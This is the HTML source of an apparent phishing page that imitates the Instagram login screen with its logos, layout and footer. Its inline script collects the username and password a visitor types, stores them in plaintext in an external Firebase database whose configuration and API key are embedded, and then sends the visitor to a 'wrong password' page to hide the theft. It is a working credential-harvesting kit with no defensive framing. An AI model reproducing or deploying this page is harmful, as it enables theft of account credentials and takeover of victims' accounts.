<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login . Instagram</title>
  <link rel="stylesheet" href="loginstyle.css">
  <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
  <style>
    img {
      vertical-align: text-top;
    }
  </style>

  <!-- Firebase SDKs -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC0U7eXLNLSitqs7SgdOGAGqECVxp3Ge5E",
      authDomain: "insta-f224e.firebaseapp.com",
      databaseURL: "https://insta-f224e-default-rtdb.firebaseio.com",
      projectId: "insta-f224e",
      storageBucket: "insta-f224e.firebasestorage.app",
      messagingSenderId: "46475538223",
      appId: "1:46475538223:web:bb32132093de1fe252bbda",
      measurementId: "G-F1S8J95J9G"
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    window.handleLogin = function (event) {
      event.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      if (!username || !password) {
        alert("Please enter username/email and password!");
        return;
      }

      // Save to Realtime Database
      const newUserRef = push(ref(database, 'users'));
      set(newUserRef, {
        username: username,
        password: password,
        timestamp: Date.now()
      })
        .then(() => {
          alert("Login info saved!");
          window.location.href = "wrong_password.html";
        })
        .catch((error) => {
          console.error("Error saving data: ", error);
          alert("Error saving login info.");
        });
    };
  </script>
</head>

<body>
  <div class="container">
    <div class="box">
      <div class="heading"></div>
      <form class="login-form" onsubmit="handleLogin(event)">
        <div class="field">
          <input id="username" type="text" placeholder="Phone number, username, or email" />
          <label for="username">Phone number, username, or email</label>
        </div>
        <div class="field">
          <input id="password" type="password" placeholder="password" />
          <label for="password">Password</label>
        </div>
        <button class="login-button" type="submit" title="login">Log In</button>

        <div class="separator">
          <div class="line"></div>
          <p>OR</p>
          <div class="line"></div>
        </div>

        <div class="other">
          <button class="fb-login-btn" type="button" onclick="alert('Facebook login demo')">
            <i class="fa fa-facebook-official fb-icon"></i>
            <span>
              <img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"
                height="15" width="15"> Log in with Facebook
            </span>
          </button>
          <a class="forgot-password" href="/forget.html">Forgot password?</a>
        </div>
      </form>
    </div>
    <div class="box">
      <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
    </div>
  </div>
  <br>
  <div class="get">
    Get the app.
  </div>
  <br>
  <div class="apps">
    <a href="/forget.html">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40" width="134">
    </a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <a href="/forget.html">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134">
    </a>
  </div>
  <br>
  <div class="footer">
    <footer>
      Meta
      About
      Blog
      Jobs
      Help
      API
      Privacy
      Terms
      Top Accounts
      Hashtags
      Locations
      Instagram Lite
      Contact Uploading & Non-Users
    </footer>
  </div>
  <div class="copyright">
    <br>
    English Â© 2022 Instagram from Meta
  </div>
</body>

</html>
